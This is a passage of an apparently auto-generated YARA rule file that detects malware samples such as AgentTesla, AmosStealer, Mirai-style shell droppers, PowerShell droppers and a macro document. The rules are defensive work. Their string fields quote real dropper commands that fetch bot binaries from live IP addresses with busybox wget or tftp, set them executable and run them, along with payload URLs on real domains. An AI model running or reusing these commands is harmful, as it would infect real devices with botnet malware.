      $s2 = "_CollectionConfigContent" fullword ascii /* score: '12.00'*/
      $s3 = "get_Gccxaezj" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e12f9f6d {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e12f9f6d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e12f9f6dd4d092492c0d9e422da3123d88ed33ebdbb77706454e0a4a534aff5e"
   strings:
      $s1 = "Fxvmbzcu.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteParameter" fullword ascii /* score: '18.00'*/
      $s3 = "RunOperationalService" fullword ascii /* score: '15.00'*/
      $s4 = "RunEditableService" fullword ascii /* score: '10.00'*/
      $s5 = "Iobul.Services" fullword ascii /* score: '10.00'*/
      $s6 = "P* -xj" fullword ascii /* score: '9.00'*/
      $s7 = "get_Gjtleur" fullword ascii /* score: '9.00'*/
      $s8 = "2%`-2NZWw+ B " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f7121d16 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f7121d16.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f7121d16f7c5e546edc168027fdcbeee4698b1038b035003002cee8a295468ad"
   strings:
      $s1 = "Ojnqgqus.exe" fullword wide /* score: '22.00'*/
      $s2 = "centralCommandNote" fullword ascii /* score: '12.00'*/
      $s3 = "ConnectIdentifiableConnection" fullword ascii /* score: '10.00'*/
      $s4 = "get_Vainggryen" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7f6c4c2e {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7f6c4c2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f6c4c2eabfbe0dcf5403ab51027fd6bb9dda23cebead8dbc3e36a2e53e7e323"
   strings:
      $s1 = "Jlkajfz.exe" fullword wide /* score: '22.00'*/
      $s2 = "DJlkajfz, Version=1.0.4922.4507, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "/IrlogFA|" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d5af0aff {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d5af0aff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d5af0affd6d73225b207677b724c56f194aeb88c053f807fd7aa2cb7ac87dd89"
   strings:
      $s1 = "Jibdskiic.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "Jibdskiic.exe" fullword wide /* score: '22.00'*/
      $s3 = "ExecutorService" fullword ascii /* score: '19.00'*/
      $s4 = "StopCombinedExecutor" fullword ascii /* score: '19.00'*/
      $s5 = "ExecuteRunner" fullword ascii /* score: '18.00'*/
      $s6 = "ExecuteCustomizableExecutor" fullword ascii /* score: '18.00'*/
      $s7 = "LeadExecutor" fullword ascii /* score: '16.00'*/
      $s8 = "FJibdskiic, Version=1.0.8888.8635, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s9 = "FindExecutor" fullword ascii /* score: '16.00'*/
      $s10 = "_ExecutorEditorName" fullword ascii /* score: '16.00'*/
      $s11 = "EnableExecutor" fullword ascii /* score: '16.00'*/
      $s12 = "ScanProcessor" fullword ascii /* score: '16.00'*/
      $s13 = "RestartExecutor" fullword ascii /* score: '16.00'*/
      $s14 = "ExecutorBuilder" fullword ascii /* score: '16.00'*/
      $s15 = "StopSetExecutor" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__98e6313f {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_98e6313f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "98e6313f49c38b685edd3c0f9be5d01af6393c81549435fb4872bc61a6b9bd6a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Qaqznghw.exe" fullword wide /* score: '22.00'*/
      $s3 = "7777777778" ascii /* score: '17.00'*/ /* hex encoded string 'wwwwx' */
      $s4 = "XVVVVVVVVVW" fullword ascii /* base64 encoded string ']UUUUUUU' */ /* score: '16.50'*/
      $s5 = "FQaqznghw, Version=1.0.7775.26740, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "oVVVVVVVVVVVVVVo" fullword ascii /* base64 encoded string 'UUUUUUUUUUZ' */ /* score: '14.00'*/
      $s7 = "ImR38VM6X09h41oyEmlt6lh5MG534Fs1HWQ/wlMjNHNw908WAm5h6FQ7CCZj4EIIN2ho6Xg2HHg/6kYIOHNh9EM2HXRw/A0wFGlbyVM5FmlsvnEyBUl99VMRA3JpzVc5" wide /* score: '11.00'*/
      $s8 = ":/3|\"\\a" fullword ascii /* score: '9.00'*/ /* hex encoded string ':' */
      $s9 = "feffefefeefa" ascii /* score: '8.00'*/
      $s10 = "ffefeeffea" ascii /* score: '8.00'*/
      $s11 = "feffeefefef" ascii /* score: '8.00'*/
      $s12 = "feffeefef" ascii /* score: '8.00'*/
      $s13 = "fefeffefefe" ascii /* score: '8.00'*/
      $s14 = "ffeeffefefe" ascii /* score: '8.00'*/
      $s15 = "fefefeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__28985635 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_28985635.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "28985635e5216cdc30add3946905a79081f44fb33b2bde647165932da7160a21"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Ncdiw.exe" fullword wide /* score: '22.00'*/
      $s3 = "CNcdiw, Version=1.0.1968.18610, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "3mnaYaJZo0LMc6tR7mTAeqkazGPacKpW4WmSUqJAyH7dZ751/mPMeKVY9CvOcLNry2XFeYlV4HWSerdrxH7MZLJV4XndbPxT6GT2WaJa6mTBLoBR+UTQZaJy/3/EXaZa" wide /* score: '10.00'*/
      $s5 = "feffeefefef" ascii /* score: '8.00'*/
      $s6 = "ffeeffefea" ascii /* score: '8.00'*/
      $s7 = "afeffefefe" ascii /* score: '8.00'*/
      $s8 = "feffefefea" ascii /* score: '8.00'*/
      $s9 = "fefeffeeffe" ascii /* score: '8.00'*/
      $s10 = "affefeeffehah" fullword ascii /* score: '8.00'*/
      $s11 = "affefeeffe" ascii /* score: '8.00'*/
      $s12 = "ffefeefeffea" ascii /* score: '8.00'*/
      $s13 = "fefefefeffe" ascii /* score: '8.00'*/
      $s14 = "afefefeffe" ascii /* score: '8.00'*/
      $s15 = "afefeffeef" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__41663cb2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_41663cb2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "41663cb27e881e2280a4ba17d3cfd02e7b5f9024e8ebc03349e7be76870560a9"
   strings:
      $s1 = "Nrlusabj.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://primeline.it.com/pure/Bqmwkklcrkc.mp4" fullword wide /* score: '17.00'*/
      $s3 = "ENrlusabj, Version=1.0.618.19312, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s5 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s6 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s7 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s8 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
      $s9 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s10 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s11 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__900bc27a {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_900bc27a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "900bc27a8373e847376ee2656a41773f554b5e78227e4c881597d24243cc3288"
   strings:
      $s1 = "Kvdilzrng.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.gugaequiposyservicios.com.mx/Ejoabc.mp3" fullword wide /* score: '17.00'*/
      $s3 = "GKvdilzrng, Version=1.0.1257.25848, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0074f661 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0074f661.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0074f661dba6f2610ccc1619f87dd88a044f80f32e9fd65c641094f968e80a28"
   strings:
      $s1 = "Thyzfs.exe" fullword wide /* score: '22.00'*/
      $s2 = "DThyzfs, Version=1.0.1951.20557, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s4 = "ZrHk:\":" fullword ascii /* score: '10.00'*/
      $s5 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s6 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s7 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s8 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
      $s9 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s10 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s11 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
      $s12 = "e?83mPoFTP+" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__0ff83c37 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_0ff83c37.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ff83c37f9a4581457831ecbe06fa4907cc6ab864e9e0597f55cd1fc9f2a1fd3"
   strings:
      $s1 = "Uoieyif.exe" fullword wide /* score: '22.00'*/
      $s2 = "Order  11758-11759.com" fullword ascii /* score: '18.00'*/
      $s3 = "EUoieyif, Version=1.0.5949.10155, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "0000666" ascii /* reversed goodware string '6660000' */ /* score: '11.00'*/
      $s5 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s6 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s7 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s8 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s9 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
      $s10 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s11 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s12 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
      $s13 = "get_Xdxfxrm" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x724f and filesize < 4000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__09d5d3ae {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_09d5d3ae.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09d5d3ae450ef3b65582057375c398b4fd1c2ae0aebb52674874c58e0fe9ecdf"
   strings:
      $s1 = "Uoieyif.exe" fullword wide /* score: '22.00'*/
      $s2 = "EUoieyif, Version=1.0.5949.10155, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s4 = "get_GigaBytes" fullword ascii /* score: '9.00'*/
      $s5 = "get_LargestWholeNumberSymbol" fullword ascii /* score: '9.00'*/
      $s6 = "get_KiloBytes" fullword ascii /* score: '9.00'*/
      $s7 = "get_TeraBytes" fullword ascii /* score: '9.00'*/
      $s8 = "get_PetaBytes" fullword ascii /* score: '9.00'*/
      $s9 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
      $s10 = "get_MegaBytes" fullword ascii /* score: '9.00'*/
      $s11 = "get_Xdxfxrm" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AmosStealer_signature__87c7807b {
   meta:
      description = "_subset_batch - file AmosStealer(signature)_87c7807b.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87c7807b7160b6343aac00bd2010ab244798d9849461e761a8b2df30c5de0488"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "swintus" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 2000KB and
      all of them
}

rule a4caf78137e6ced7c4dc51149cedb1f8d94c5447d4ccf525e2b785a9904f0c2f_a4caf781 {
   meta:
      description = "_subset_batch - file a4caf78137e6ced7c4dc51149cedb1f8d94c5447d4ccf525e2b785a9904f0c2f_a4caf781.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4caf78137e6ced7c4dc51149cedb1f8d94c5447d4ccf525e2b785a9904f0c2f"
   strings:
      $s1 = "busybox wget http://41.216.189.108/00101010101001/sora.arm; chmod 777 fbot.arm; ./sora.arm android" fullword ascii /* score: '23.00'*/
      $s2 = "busybox wget http://41.216.189.108/00101010101001/sora.ppc; chmod 777 sora.ppc; ./sora.ppc android" fullword ascii /* score: '23.00'*/
      $s3 = "busybox wget http://41.216.189.108/00101010101001/sora.mips; chmod 777 sora.mips; ./sora.mips android" fullword ascii /* score: '20.00'*/
      $s4 = "busybox wget http://41.216.189.108/00101010101001/sora.x86_64; chmod 777 sora.x86_64; ./sora.x86_64 android" fullword ascii /* score: '20.00'*/
      $s5 = "busybox wget http://41.216.189.108//sora.x86; chmod 777 sora.x86; ./sora.x86 android" fullword ascii /* score: '20.00'*/
      $s6 = "busybox wget http://41.216.189.108/00101010101001/sora.arm6; chmod 777 sora.arm6; ./sora.arm6 android" fullword ascii /* score: '20.00'*/
      $s7 = "busybox wget http://41.216.189.108/00101010101001/sora.sh4; chmod 777 sora.sh4; ./sora.sh4 android" fullword ascii /* score: '20.00'*/
      $s8 = "busybox wget http://41.216.189.108/00101010101001/sora.arm7; chmod 777 sora.arm7; ./sora.arm7 android" fullword ascii /* score: '20.00'*/
      $s9 = "busybox wget http://41.216.189.108/00101010101001/sora.mpsl; chmod 777 sora.mpsl; ./sora.mpsl android" fullword ascii /* score: '20.00'*/
      $s10 = "busybox wget http://41.216.189.108/00101010101001/sora.m68k; chmod 777 sora.m68k; ./sora.m68k android" fullword ascii /* score: '20.00'*/
      $s11 = "busybox wget http://41.216.189.108/00101010101001/sora.arm5; chmod 777 sora.arm5; ./sora.arm5 android" fullword ascii /* score: '20.00'*/
      $s12 = "busybox wget http://41.216.189.108/00101010101001/sora..spc; chmod 777 sora.spc; ./sora.spc android" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 3KB and
      8 of them
}

rule a4db924fa5418bdcbd22114b0bdba489b40569c4bcc256b99bcae874d8dcfbec_a4db924f {
   meta:
      description = "_subset_batch - file a4db924fa5418bdcbd22114b0bdba489b40569c4bcc256b99bcae874d8dcfbec_a4db924f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4db924fa5418bdcbd22114b0bdba489b40569c4bcc256b99bcae874d8dcfbec"
   strings:
      $x1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox tftp -g -r bot.spc 77.83.240.93 ; chmod 777 bot.spc" ascii /* score: '31.00'*/
      $x2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox tftp -g -r bot.ppc 77.83.240.93 ; chmod 777 bot.ppc" ascii /* score: '31.00'*/
      $x3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox tftp -g -r bot.spc 77.83.240.93 ; chmod 777 bot.spc" ascii /* score: '31.00'*/
      $x4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox tftp -g -r bot.ppc 77.83.240.93 ; chmod 777 bot.ppc" ascii /* score: '31.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv5l ; /bin/busybox tftp -g -r bot.armv5l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox tftp -g -r bot.i586 77.83.240.93 ; chmod 777 bot.i" ascii /* score: '28.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.m68k ; /bin/busybox tftp -g -r bot.m68k 77.83.240.93 ; chmod 777 bot.m" ascii /* score: '28.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv6l ; /bin/busybox tftp -g -r bot.armv6l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv6l ; /bin/busybox tftp -g -r bot.armv6l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv5l ; /bin/busybox tftp -g -r bot.armv5l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv7l ; /bin/busybox tftp -g -r bot.armv7l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox tftp -g -r bot.i686 77.83.240.93 ; chmod 777 bot.i" ascii /* score: '28.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox tftp -g -r bot.mipsel 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv4l ; /bin/busybox tftp -g -r bot.armv4l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv7l ; /bin/busybox tftp -g -r bot.armv7l 77.83.240.93 ; chmod 777 b" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 4KB and
      1 of ($x*) and all of them
}

rule a592894f65fc047794df7343fe89080121edc4a040fdf7dfc867714495272777_a592894f {
   meta:
      description = "_subset_batch - file a592894f65fc047794df7343fe89080121edc4a040fdf7dfc867714495272777_a592894f.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a592894f65fc047794df7343fe89080121edc4a040fdf7dfc867714495272777"
   strings:
      $s1 = "$YBWTBTNEUCVVK = \"$env:TEMP\\\\Microsoft3.zip\"" fullword ascii /* score: '14.00'*/
      $s2 = "# DQDFJBNGY o JDIVMHH SYSFIKPN" fullword ascii /* score: '8.00'*/
      $s3 = "Invoke-WebRequest -Uri $BADTT -OutFile $YBWTBTNEUCVVK" fullword ascii /* score: '8.00'*/
      $s4 = "# SWSCDOLVCQDTVKVGD do CHBJVEK BEGSALJK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 1KB and
      all of them
}

rule aa17565ecc68edda34012826c752c7f7c09f8f072abc19472a97e4a6ed58ea85_aa17565e {
   meta:
      description = "_subset_batch - file aa17565ecc68edda34012826c752c7f7c09f8f072abc19472a97e4a6ed58ea85_aa17565e.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa17565ecc68edda34012826c752c7f7c09f8f072abc19472a97e4a6ed58ea85"
   strings:
      $x1 = "==AAAAAAAAAAAAAA8gPPYzDv8wJP8xDW8wEPswDA7Q+OEvDp7A4OgtDP7whOwrDz6wqOMqDb6QkOooDE6ggOEoDA5wfO4nD95A6M0MDMyQqMgKDhyAoM8JDcyglMIJDO" ascii /* score: '51.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                               ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                    ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                        ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                            ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                            ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                  ' */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */ /* score: '26.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                    ' */ /* score: '26.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */ /* score: '26.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
   condition:
      uint16(0) == 0xbbef and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__21371b611d91188d602926b15db6bd48_imphash_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_21371b611d91188d602926b15db6bd48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a57afe5938c995e207de67907eb7c5463d6ed5b8def8c4e4b782cfa4cd95dc2a"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "vrrxwvov" fullword ascii /* score: '8.00'*/
      $s4 = "psspucw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule a9900e615f0d0e1f4737ffe25a4346b09e556b7c9d7c6a3a9db7a3d55506d90e_a9900e61 {
   meta:
      description = "_subset_batch - file a9900e615f0d0e1f4737ffe25a4346b09e556b7c9d7c6a3a9db7a3d55506d90e_a9900e61.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a9900e615f0d0e1f4737ffe25a4346b09e556b7c9d7c6a3a9db7a3d55506d90e"
   strings:
      $s1 = "6e687d344c6e5e444a6229556e3a50367e4c367256472b2278727e396f3f4b525e2e416c4b416f57644e324d6364594d4e6244336d4f364d58622947723a2c68" ascii /* score: '24.00'*/ /* hex encoded string 'nh}4Ln^DJb)Un:P6~L6rVG+"xr~9o?KR^.AlKAoWdN2McdYMNbD3mO6MXb)Gr:,h' */
      $s2 = "6e642049662e00000043003a005c00550073006500720073005c005500740065006e00740065005c0041007000700044006100740061005c004c006f0063" ascii /* score: '24.00'*/ /* hex encoded string 'nd If.C:\Users\Utente\AppData\Loc' */
      $s3 = "6d652873747246696c6529202620222d2220262053706c69742864742e56616c75652c20222e2229283029202620222e222026206f46534f2e47657445787465" ascii /* score: '24.00'*/ /* hex encoded string 'me(strFile) & "-" & Split(dt.Value, ".")(0) & "." & oFSO.GetExte' */
      $s4 = "00003800000052003a005c004c00410042002d0049004e00500053005c005700410052005c0070006100740065006e00740065002e00690063006f0000004600" ascii /* score: '24.00'*/ /* hex encoded string '8R:\LAB-INPS\WAR\patente.icoF' */
      $s5 = "0065005c0041007000700044006100740061005c004c006f00630061006c005c00540065006d0070005c00430041005200540041002d004900440045004e0054" ascii /* score: '24.00'*/ /* hex encoded string 'e\AppData\Local\Temp\CARTA-IDENT' */
      $s6 = "2620222d2220262053706c69742864742e56616c75652c20222e2229283029202620222e222026206f46534f2e476574457874656e73696f6e4e616d65287374" ascii /* score: '24.00'*/ /* hex encoded string '& "-" & Split(dt.Value, ".")(0) & "." & oFSO.GetExtensionName(strFile)' */
      $s7 = "202020206f53747265616d2e53617665546f46696c65206f46534f2e4275696c645061746828737472466f6c6465722c2073747246696c65292c206164536176" ascii /* score: '24.00'*/ /* hex encoded string '    oStream.SaveToFile oFSO.BuildPath(strFolder, strFile), adSaveCreateOverWrite' */
      $s8 = "0065005c0041007000700044006100740061005c004c006f00630061006c005c00540065006d0070005c00430041005200540041002d004900440045004e0054" ascii /* score: '24.00'*/ /* hex encoded string 'e\AppData\Local\Temp\CARTA-IDENTITA.vbe' */
      $s9 = "656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d2261636365" ascii /* score: '24.00'*/ /* hex encoded string 'ent2="accent2" accent3="accent3" accent4="accent4" accent5="acce' */
      $s10 = "6d652873747246696c6529202620222d2220262053706c69742864742e56616c75652c20222e2229283029202620222e222026206f46534f2e47657445787465" ascii /* score: '24.00'*/ /* hex encoded string 'me(strFile) & "-" & Split(dt.Value, ".")(0) & "." & oFSO.GetExtensionName(strFile)' */
